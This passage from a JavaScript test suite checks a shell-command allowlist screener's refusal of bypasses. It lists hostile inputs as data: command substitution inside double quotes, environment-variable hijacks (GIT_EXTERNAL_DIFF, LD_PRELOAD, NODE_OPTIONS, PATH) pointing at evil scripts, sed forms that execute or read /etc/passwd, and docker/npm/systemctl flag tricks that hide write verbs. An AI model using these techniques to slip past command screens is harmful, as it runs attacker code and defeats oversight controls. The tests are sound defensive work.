    // Assembled rather than written literally, so this guard does not trip on
    // its own source. The shape is "<n> of 31" — the retired headline.
    const retired = new RegExp(String.raw`\b\d+ of ${31}\b`);
    assert.equal(
      retired.test(src), false,
      `${path} re-introduces the retired "${retired}" statistic — it is unrecoverable and may not be quoted again`,
    );
  }
});

// ── 12. WAVE 5: TWO UPSTREAM RCE PRIMITIVES, FOUR WRITE-FLAG HOLES, AND THE
//        TWO FALSE REFUSALS THAT WERE GETTING THE SCREEN ROUTED AROUND ───────
//
// Waves 2-4 all tightened HEAD RULES. Both primitives closed here sit OUTSIDE
// that layer — one ABOVE it (quote masking, which every layer below trusts) and
// one BELOW it (the environment prefix, stripped before any head was consulted)
// — which is exactly why four waves of head-rule tightening never reached
// either. Both were live-proven to EXECUTE, the first through `censusOne`
// itself.
//
// The widenings ship in the SAME slice on purpose (charter D63). A screen that
// only ever tightens is one its own operators route around, and this suite
// asserts both directions on every one of them.

// ── (A) DOUBLE-QUOTED COMMAND SUBSTITUTION ───────────────────────────────────

test("double-quoted command substitution EXECUTES in sh and is REFUSED", () => {
  // FAIL-BEFORE, run against origin/main:
  //   censusOne('grep -n "$(id > /tmp/DQ_MARK)" .')
  //     -> {"screened":true,"executed":true,"exit":2,...}
  //   /tmp/DQ_MARK existed afterwards, 358 bytes, carrying live `id` output
  //     (uid=501(pelle) gid=20(staff) ...)
  // Every layer below the mask saw `grep -n QQQQ .` — an ordinary read.
  for (const cmd of [
    'grep -n "$(id > /tmp/DQ_MARK)" .',
    'grep -n "`id > /tmp/DQ_MARK`" .',
    'ls "$(whoami)"',
    'cat "prefix $(id) suffix"',
  ]) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
    assert.match(r.reason, /DOUBLE-quoted span/, `the reason must NAME the double-quoted span — got: ${r.reason}`);
  }
});

test("CONTROL: single-quoted $( ) and backticks stay ADMITTED — they are genuinely inert", () => {
  // A fix that blanket-refuses quoting would be the wrong fix: it buys this hole
  // with most of the census's reach, and quoted patterns are the most ordinary
  // read shape there is.
  for (const cmd of [
    "grep -n '$(id)' .",
    "grep -n 'x`y`z' .",
    "grep -rn '$(cat /etc/passwd)' docs/",
    'grep -n "func handle" internal/cli/root.go',
    'grep -n "\\$(id)" .', // backslash-escaped inside double quotes: sh does NOT expand it
  ]) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("doubleQuoteExpansionReason is tested directly, both directions", () => {
  assert.equal(doubleQuoteExpansionReason('a "$(b)" c') !== null, true);
  assert.equal(doubleQuoteExpansionReason('a "`b`" c') !== null, true);
  assert.equal(doubleQuoteExpansionReason("a '$(b)' c"), null);
  assert.equal(doubleQuoteExpansionReason('a "\\$(b)" c'), null, "an escaped $ inside double quotes does not expand");
  assert.equal(doubleQuoteExpansionReason('a "$HOME" c'), null, "a parameter expansion is DATA, not a command that ran");
});

// ── (B) THE ENVIRONMENT-ASSIGNMENT PREFIX ────────────────────────────────────

test("environment-assignment prefixes are SCREENED, not stripped and discarded", () => {
  // FAIL-BEFORE: all of these were ADMITTED on origin/main, and the first four
  // were live-proven to execute attacker-controlled code — the assignment was
  // matched, stripped, and never looked at again, BELOW every head rule.
  for (const cmd of [
    "GIT_EXTERNAL_DIFF=./evil.sh git diff HEAD~1",
    "GIT_PAGER=./evil.sh git log -1",
    "PAGER=./evil.sh gh pr view 1",
    "NODE_OPTIONS=--require=./evil.cjs node --test ok.test.mjs",
    "GIT_SSH_COMMAND=./evil.sh git log -1",
    "PATH=/tmp/evil:$PATH git log -1",
    "LD_PRELOAD=./evil.so git log -1",
  ]) {
    assert.equal(screenCommand(cmd).ok, false, `MUST REFUSE: ${cmd}`);
  }
  // CC names a program cgo genuinely executes, so its VALUE is bounded too.
  assert.equal(screenCommand("CC=./evil.sh go test ./...").ok, false, "CC must not name a relative script");
});

test("CONTROL: the benign environment prefixes the corpus actually uses stay ADMITTED", () => {
  for (const cmd of [
    "MIX_ENV=test mix test",
    "CC=/usr/bin/clang go vet ./...",
    "CC=clang go vet ./internal/cli/...",
    "CC=/usr/bin/clang MIX_ENV=test mix test --seed 111",
    "MIX_TEST_PARTITION=w22v1 CC=clang mix test test/barkpark/secrets_castgap_probe_test.exs",
    // The quoted spellings of the same two assignments — see the both-directions
    // assertions in the envAssignmentReason test below.
    'CC="/usr/bin/clang" mix test --seed 111',
    "CC='clang' go vet ./...",
  ]) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
  // HONEST BOUND, stated rather than hidden: `CC=clang go build ./...` is named
  // in this slice's brief as a control, and it is REFUSED — but not by this fix.
  // `go build` has never been on goRule's read-only sub-verb list (it compiles,
  // and with cgo it invokes CC), and it was already refused on origin/main for
  // that reason. The env fix neither caused nor changed that.
  const build = screenCommand("CC=clang go build ./...");
  assert.equal(build.ok, false);
  assert.match(build.reason, /go sub-verb "build"/, "refused by the go rule, NOT by the environment allowlist");
});

test("envAssignmentReason is tested directly, both directions", () => {
  assert.equal(envAssignmentReason("MIX_ENV", "test"), null);
  assert.equal(envAssignmentReason("CC", "clang"), null);
  assert.equal(envAssignmentReason("CC", "/usr/bin/clang"), null);
  assert.notEqual(envAssignmentReason("CC", "./evil.sh"), null);
  // A QUOTED value is the SAME value, and refusing it was a false refusal of the
  // exact class D63 exists to close. Both directions, so the quote strip cannot
  // become a way to smuggle a relative script past the program bound.
  assert.equal(envAssignmentReason("CC", '"/usr/bin/clang"'), null);
  assert.equal(envAssignmentReason("CC", "'clang'"), null);
  assert.notEqual(envAssignmentReason("CC", '"./evil.sh"'), null, "quoting a relative script must not admit it");
  assert.notEqual(envAssignmentReason("CC", "'./evil.sh'"), null);
  assert.notEqual(envAssignmentReason("PATH", "/tmp/evil"), null);
  assert.notEqual(envAssignmentReason("GIT_PAGER", "less"), null);
  assert.notEqual(envAssignmentReason("MIX_ENV", "$(id)"), null, "a value that expands cannot be bounded");
});

// ── (C) FOUR WRITE-FLAG HOLES — heads that HAD a rule which MISSED a flag ────

test("git --output writes a file, in BOTH spellings", () => {
  for (const cmd of ["git log --output=/tmp/evil.txt", "git log --output /tmp/evil.txt", "git diff --output=/tmp/e HEAD~1"]) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
    assert.match(r.reason, /--output/);
  }
  assert.equal(screenCommand("git log --oneline -5").ok, true);
});

test("npm's writing sub-verbs are refused; its reading ones stay admitted", () => {
  // npm was a bare verbRule reading only the TOP-LEVEL verb, so every sub-verb
  // under `config` and `version` was admitted by a rule that never looked.
  for (const cmd of [
    "npm config set registry http://evil",
    "npm config delete registry",
    "npm version patch",
    "npm version major",
    "npm install",
    "npm run build",
  ]) {
    assert.equal(screenCommand(cmd).ok, false, `MUST REFUSE: ${cmd}`);
  }
  for (const cmd of ["npm version", "npm config get registry", "npm config list", "npm view astro version", "npm ls --depth 0"]) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("mix test's coverage flags write to disk and are refused", () => {
  for (const cmd of ["mix test --cover", "mix test --export-coverage=x", "MIX_ENV=test mix test --cover"]) {
    assert.equal(screenCommand(cmd).ok, false, `MUST REFUSE: ${cmd}`);
  }
  for (const cmd of ["mix test test/barkpark/sites/deploy_runner_test.exs:583", "mix test --seed 111", "mix test --trace"]) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("go's write and profiling flags are matched by NAME, not by exact token", () => {
  // `hasFlag(argv, "-o", "-exec")` was an EXACT-TOKEN match, which is why
  // `go test -c -o /tmp/evil` was ALREADY refused (the bare `-o` is present)
  // while `go test -c` alone and every `-flag=value` sailed through. Live-proven
  // on the admitted side: `-c -o` produced a 4.1MB binary, `-coverprofile=`
  // produced a real file.
  for (const cmd of [
    "go test -c",
    "go test -c ./internal/cli/",
    "go test -o /tmp/evil ./...",
    "go test -exec /tmp/evil ./...",
    "go test -coverprofile=/tmp/evil.out ./...",
    "go test -coverprofile /tmp/evil.out ./...",
    "go test -cpuprofile=/tmp/evil.out ./...",
    "go test -memprofile=/tmp/evil.out ./...",
    "go test -blockprofile=/tmp/e ./...",
    "go test -mutexprofile=/tmp/e ./...",
    "go test -trace=/tmp/e ./...",
    "go test -outputdir=/tmp ./...",
    "go env -w GOFLAGS=-mod=mod",
  ]) {
    assert.equal(screenCommand(cmd).ok, false, `MUST REFUSE: ${cmd}`);
  }
  // NAME equality, not prefix matching — this is what keeps `-cover` (a stdout
  // summary) distinct from `-c` (a binary on disk) and `-coverprofile` (a file).
  for (const cmd of [
    "go test ./...",
    "go test -cover ./...",
    "go test -count=1 -v ./internal/cli/...",
    "go test ./internal/cli/... -run TestFoo -v",
    "go vet ./...",
    "go env GOPATH",
  ]) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("hostname with a positional SETS the hostname and is refused", () => {
  assert.equal(screenCommand("hostname evil-name").ok, false);
  assert.equal(screenCommand("hostname").ok, true);
  assert.equal(screenCommand("hostname -f").ok, true);
});

// ── (D1) FALSE REFUSAL: A PATTERN IS NOT A TARGET ────────────────────────────

test("the host bound runs AFTER quote masking, so a quoted hostname is DATA", () => {
  // FAIL-BEFORE: refused as `host bound: names ssh (remote execution)`. This
  // wave reads ops docs, whose most quotable lines all contain `ssh`.
  for (const cmd of [
    'cd /x && grep -c "ssh" docs/ops/PROD_OPS.md',
    "grep -rn 'rsync' docs/ops/",
    'grep -n "guerrilla" docs/ops/PROD_OPS.md',
    'rg "barkpark.cloud" docs/',
  ]) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("the host bound still REFUSES a host that appears as SYNTAX, not data", () => {
  for (const cmd of [
    "ssh root@host uptime",
    "ssh -i ~/.ssh/barkpark_indx root@157.180.90.121 uptime",
    "scp /tmp/x root@host:/tmp/x",
    "rsync -a ./ host:/opt/barkpark/",
    "curl -s https://guerrilla.barkpark.cloud/api/schemas",
    "git log --oneline 157.180.90.121",
  ]) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
  }
});

test("MUTATION PROOF: reverting the host bound to the RAW string re-breaks the honest read", () => {
  // The re-ordering is the fix, so the proof must be that the OLD order fails.
  // `hostBoundReason` itself is unchanged; what changed is WHAT IT IS GIVEN.
  const honest = 'cd /x && grep -c "ssh" docs/ops/PROD_OPS.md';
  assert.notEqual(hostBoundReason(honest), null, "on the RAW string the pattern is misread as a target — the defect");
  assert.equal(hostBoundReason(maskQuotedSpans(honest)), null, "on the MASKED string it is data — the fix");
  // And the direction that matters is untouched by the re-ordering.
  const real = "ssh root@157.180.90.121 uptime";
  assert.notEqual(hostBoundReason(maskQuotedSpans(real)), null, "an unquoted ssh is still syntax, still refused");
});

// ── (D2) FALSE REFUSAL: sed IS JUDGED ON ITS SCRIPT, NOT ITS HEAD ────────────

test("read-only sed is ADMITTED — the largest refusal class in real foreign output", () => {
  // 7 of 9 refusals over this wave's own survey facts were `sed -n 'N,Mp'`
  // line citations. The rerun harness's own schema description gives
  // `git show origin/main:path | sed -n 40,60p` as its FIRST worked example, so
  // the instrument was refusing the idiom it instructs producers to emit.
  for (const cmd of [
    "sed -n '40,60p' docs/ops/PROD_OPS.md",
    "git show origin/main:a.md | sed -n '40,60p'",
    "sed -n '18p' docs/cards/studio.md",
    "sed -n '82p;98p;130p' api/test/x_test.exs",
    "sed -n '/type ChatWorkflowSummary struct/,/^}/p' internal/apiclient/chat.go",
    "sed -n '$p' notes.md",
    "sed '5q' notes.md",
    "sed '1d' notes.md",
    "sed 's/foo/bar/g' notes.md",
    "sed -e '1,5p' -e '9q' notes.md",
    "sed -E 's/[0-9]+/N/g' notes.md",
    "cat notes.md | sed -n '1,10p' | head -3",
    // `--` ends the flags; only the FIRST bare positional is a script. Taking
    // every positional after `--` made these screen the FILENAME as a script.
    "sed '1p' -- notes.md",
    "sed -n '1,5p' -- notes.md",
  ]) {
    assert.equal(screenCommand(cmd).ok, true, `MUST ADMIT: ${cmd} — ${screenCommand(cmd).reason}`);
  }
});

test("every sed WRITE form is still REFUSED — by the parser, not by the head", () => {
  for (const [cmd, needle] of [
    ["sed -i 's/a/b/' api/lib/barkpark/application.ex", /-i EDITS/],
    ["sed -i.bak 's/a/b/' notes.md", /-i EDITS/],
    ["sed -n 'w /opt/barkpark/deploy/site-deploy.sh' notes.md", /`w`/],
    ["sed 's/x/y/w /opt/barkpark/deploy/site-deploy.sh' notes.md", /s\/\/\/w WRITES/],
    ["sed 's/x/y/e' notes.md", /s\/\/\/e EXECUTES/],
    ["sed -e 'w /tmp/evil' -n notes.md", /`w`/],
    ["sed -f /tmp/evil.sed notes.md", /-f runs a script FILE/],
    ["sed '1e id' notes.md", /`e`/],
    ["sed '1r /etc/passwd' notes.md", /`r`/],
    ["sed --in-place 's/a/b/' notes.md", /-i EDITS/],
  ]) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE: ${cmd}`);
    assert.match(r.reason, needle, `wrong reason for ${cmd}: ${r.reason}`);
  }
});

test("screenSedScript fails CLOSED on anything it cannot parse", () => {
  // The bound is stated in the module and asserted here: an unmodelled construct
  // is REFUSED, never ignored. Several of these are harmless; they are refused
  // because the parser does not model them.
  for (const script of ["1~3p", "1,+3p", "/a/{p;p}", "y/abc/xyz/", "b end", ":top", "a\\text", "/unterminated"]) {
    assert.notEqual(screenSedScript(script), null, `MUST REFUSE unparsed script: ${script}`);
  }
  // And the read forms it does model stay clean.
  for (const script of ["40,60p", "18p", "$p", "5q", "1d", "s/a/b/g", "s|a|b|", "/x/,/y/p", "82p;98p;130p", "s/a\\/b/c/"]) {
    assert.equal(screenSedScript(script), null, `MUST ADMIT script: ${script} — ${screenSedScript(script)}`);
  }
  // A `;` inside a regex address is NOT a clause separator — the reason this is
  // a scanner rather than a split-on-";" regex.
  assert.equal(screenSedScript("/a;b/p"), null);
  assert.notEqual(screenSedScript("s;a;b;w /tmp/evil"), null, "a user-chosen delimiter must not hide the w flag");
});

test("the wave-5 shapes are carried by the SHIPPED named sets, not only by this file", () => {
  // A named set only measures the spellings it contains — the standing lesson
  // from the clustered `curl -so` miss. So every wave-5 shape lives in
  // DANGER_SET / NEVER_CRY_WOLF_SET, where `--selftest` exercises it.
  const danger = DANGER_SET.join("\n");
  for (const needle of ['"$(id', "GIT_EXTERNAL_DIFF=", "PAGER=", "NODE_OPTIONS=", "PATH=", "--output", "npm config set", "npm version patch", "--cover", "go test -c", "hostname evil-name", "sed -i"]) {
    assert.ok(danger.includes(needle), `DANGER_SET must carry the ${needle} shape`);
  }
  const wolf = NEVER_CRY_WOLF_SET.join("\n");
  for (const needle of ["sed -n", '"ssh"', "'$(id)'", "npm version", "-cover", "hostname"]) {
    assert.ok(wolf.includes(needle), `NEVER_CRY_WOLF_SET must carry the ${needle} shape`);
  }
  const { falsePermissions, falseRefusals } = runNamedSets();
  assert.deepEqual(falsePermissions, [], "a false PERMISSION is an execution");
  assert.deepEqual(falseRefusals, [], "a false REFUSAL is how the screen gets routed around");
});

// ─────────────────────────────────────────────────────────────────────────────
// THE VALUE-GLOBAL SET WAS SHORT ON FOUR HEADS, AND CLUSTERS WALKED PAST IT
// ─────────────────────────────────────────────────────────────────────────────
//
// Three waves have now enumerated "the tokens that eat their neighbour" for
// docker/pnpm/npm/systemctl, and all three enumerations were SHORT. What was
// still admitted on origin/main after them, re-measured for this wave:
//
//   docker -c ps exec …           `-c` is the SHORT SPELLING of `--context`,
//                                 which the previous fix had already named
//   docker -l / --log-level ps …  three more `string` globals: --tlscacert,
//   docker --tlscacert ps …       --tlscert, --tlskey
//   docker -Dc ps exec …          the CLUSTERED spelling of any of the above
//   pnpm  --dir ls add lodash     `--dir` is pnpm's PRIMARY name; `-C`/`--prefix`
//                                 (both already fixed) are its aliases
//   pnpm  --loglevel / --reporter / --filter ls add lodash
//   pnpm  -rC ls add lodash       clustered
//   npm   --tag / --otp ls publish
//   npm   --script-shell ls run build
//   systemctl -p status restart barkpark.service   (+ a dozen more required-arg
//   systemctl -qH status restart barkpark.service   globals, and clusters)
//   launchctl -w list unload /L/foo.plist
//
// EXECUTED LIVE on the authoring host, with a harmless verb standing in for the
// dangerous one, to prove the parser really does eat the token rather than error:
//
//   docker --tlscacert ps version  → printed `docker version` output
//   docker --tlscert   ps version  → printed `docker version` output
//   docker -Dc         ps version  → resolved CONTEXT `ps`, then ran `version`
//   docker -Dl         ps version  → parsed `ps` as the LOG LEVEL
//   pnpm  --loglevel   ls root     → printed /private/tmp/node_modules (RAN `root`)
//   pnpm  --reporter   ls root     → printed /private/tmp/node_modules (RAN `root`)
//   pnpm  -rC          ls root     → ate `ls` as the DIRECTORY
//   npm   --tag        ls config get tag  → printed `ls` (the eaten value)
//   npm   --otp        ls config get otp  → printed `ls`
//   npm   --script-shell ls config get script-shell → printed `ls`
//
// systemd is Linux-only, so its rows are DOCUMENTED (systemctl(1)'s own
// required-argument options) rather than live-executed — stated, not implied.
//
// TWO layers went in, because the first three attempts at layer one were each
// short: the enumeration is completed AND every head carries a write-verb
// backstop scanned over the whole argv, the shape ghRule/bpRule already use.

test("the value-global set was SHORT — the missing globals no longer hide a write", () => {
  const refused = [
    // docker — the short alias of an already-fixed long flag, plus four more.
    "docker -c ps exec -it foo bash",
    "docker -l ps exec -it foo bash",
    "docker --log-level ps exec -it foo bash",
    "docker --tlscacert ps exec -it foo bash",
    "docker --tlscert ps run --privileged alpine sh",
    "docker --tlskey ps run --rm -v /:/host alpine sh",
    // pnpm — `--dir` is the PRIMARY spelling of the `-C` the last fix named.
    "pnpm --dir ls add lodash",
    "pnpm --loglevel ls add lodash",
    "pnpm --reporter ls install",
    "pnpm --filter ls add lodash",
    // npm — `publish` and `run` are writes the layer-(c) backstop's regex
    // (which names `install`) never covered.
    "npm --tag ls publish",
    "npm --otp ls publish",
    "npm --script-shell ls run build",
    // systemctl — a dozen required-argument globals beyond the remote-hop three.
    "systemctl -p status restart barkpark.service",
    "systemctl -t status restart barkpark.service",
    "systemctl --state status restart barkpark.service",
    "systemctl -o status restart barkpark.service",
    "systemctl --image status restart barkpark.service",
    "systemctl --job-mode status restart barkpark.service",
    "systemctl -s status kill barkpark.service",
    "systemctl --what status clean barkpark.service",
  ];
  for (const cmd of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE the collision: ${cmd} → ${r.reason}`);
  }
});

test("SHORT GLOBALS CLUSTER — `-Dc ps exec` is the same bypass two characters along", () => {
  // getopt and pflag agree: in `-abc` the first value-taking letter consumes the
  // REST of the cluster, and only consumes the NEXT TOKEN when it is last.
  const refused = [
    "docker -Dc ps exec -it foo bash",       // -D boolean, -c last → eats `ps`
    "docker -Dl ps exec -it foo bash",
    "pnpm -rC ls add lodash",                 // -r recursive, -C last → eats `ls`
    "systemctl -qH status restart barkpark.service",
    "systemctl -aM status restart barkpark.service",
  ];
  for (const cmd of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `MUST REFUSE the clustered collision: ${cmd} → ${r.reason}`);
  }
  // A cluster with the value ATTACHED eats nothing more — `-Dcps` is `-D -c ps`,
  // so the token after it really IS the sub-verb and an honest read must survive.
  assert.equal(screenCommand("docker -Dcmyctx ps").ok, true, "attached-value cluster must not eat the sub-verb");
  // A cluster with no value-taking letter at all eats nothing.
  assert.equal(screenCommand("docker -Dv ps").ok, true, "boolean-only cluster must not eat the sub-verb");
});

test("the write-verb backstop refuses a dangerous verb WHEREVER it sits", () => {
  // The point of the second layer: a value-global that THIS wave also missed
  // still cannot hide the verb, because the verb is a bare token regardless.
  // `--utterly-unknown-flag` stands in for that unnamed global.
  const refused = [
    "docker --utterly-unknown-flag ps exec -it foo bash",
    "pnpm --utterly-unknown-flag ls add lodash",
    "npm --utterly-unknown-flag ls publish",
    "systemctl --utterly-unknown-flag status restart barkpark.service",
    // launchctl has NO pre-verb global region, so nothing eats — but
    // `firstNonFlag` SKIPS leading flags for every head, so the sub-verb
    // resolved to `list` and `unload` sat untouched two tokens on.
    "launchctl -w list unload /Library/LaunchDaemons/foo.plist",
  ];
  for (const cmd of refused) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, false, `backstop MUST REFUSE: ${cmd} → ${r.reason}`);
    assert.match(r.reason, /write\/exec verb|not on the read-only allowlist/, `and name why: ${cmd} → ${r.reason}`);
  }
});

test("neither layer over-refuses the honest reads on these five heads", () => {
  const admitted = [
    "docker ps",
    "docker -D ps",
    "docker -c myctx ps",
    "docker --log-level debug images",
    "docker --tlscacert /home/me/ca.pem version",
    "pnpm --dir /some/dir ls",
    "pnpm --filter @barkpark/core list",
    "pnpm --loglevel silent outdated",
    "npm --tag latest view express",
    "npm --registry https://registry.npmjs.org ls",
    "npm config get registry",
    "npm config list",
    "npm version",
    "systemctl status barkpark.service",
    "systemctl --no-pager status barkpark.service",
    "systemctl -p ActiveState show barkpark.service",
    "systemctl list-units --type=service",
    "launchctl list",
  ];
  for (const cmd of admitted) {
    const r = screenCommand(cmd);
    assert.equal(r.ok, true, `MUST ADMIT the honest read: ${cmd} → ${r.reason}`);
  }
});

test("MUTATION PROOF: removing the added globals AND the backstop re-admits every row", () => {
  // Reproduces the pre-fix rule exactly — the previous wave's four-member docker
  // set, exact-token comparison only, no backstop — and asserts the rows this
  // wave found were ADMITTED by it. A fix nothing can re-break is a fix nothing
  // was proven to close.
  const stale = new Set(["-H", "--host", "--context", "--config"]);
  const preFix = (raw) => {
    const out = [raw[0]];
    let i = 1;
    for (; i < raw.length; i++) {
      if (stale.has(raw[i])) { i++; continue; }
      if (raw[i].startsWith("-")) { out.push(raw[i]); continue; }
      break;
    }
    for (; i < raw.length; i++) out.push(raw[i]);
    return out;
  };
  const READ = new Set(["ps", "images", "logs", "inspect", "version", "info", "stats", "top", "port"]);
  for (const cmd of ["docker -c ps exec -it foo bash", "docker -l ps exec -it foo bash", "docker --tlscacert ps exec -it foo bash", "docker -Dc ps exec -it foo bash"]) {
    const argv = preFix(cmd.split(/\s+/));
    const verb = argv.slice(1).find((t) => !t.startsWith("-")) ?? null;
    assert.ok(READ.has(verb), `the pre-fix rule ADMITTED ${cmd} (it read the sub-verb as "${verb}")`);
    assert.equal(screenCommand(cmd).ok, false, `and the shipped rule refuses it: ${cmd}`);
  }
});

test("the fourth-wave shapes are carried by the SHIPPED named sets, not only by this file", () => {
  // Same standing lesson as the wave-5 block above: a named set measures only
  // the spellings it contains, so every row this wave found lives where
  // `node screen.mjs --selftest` exercises it, not merely here.
  const danger = DANGER_SET.join("\n");
  for (const needle of ["docker -c ps exec", "docker -l ps exec", "--tlscacert", "docker -Dc ps", "pnpm --dir ls add", "pnpm -rC ls add", "npm --tag ls publish", "npm --script-shell ls run", "systemctl -p status restart", "systemctl -qH status restart", "launchctl -w list unload"]) {
    assert.ok(danger.includes(needle), `DANGER_SET must carry the ${needle} shape`);
  }
  const wolf = NEVER_CRY_WOLF_SET.join("\n");
  for (const needle of ["docker -D ps", "docker -c myctx ps", "pnpm --dir /some/dir ls", "npm --tag latest view", "systemctl -p ActiveState show", "launchctl list"]) {
    assert.ok(wolf.includes(needle), `NEVER_CRY_WOLF_SET must carry the honest mirror ${needle}`);
  }
});
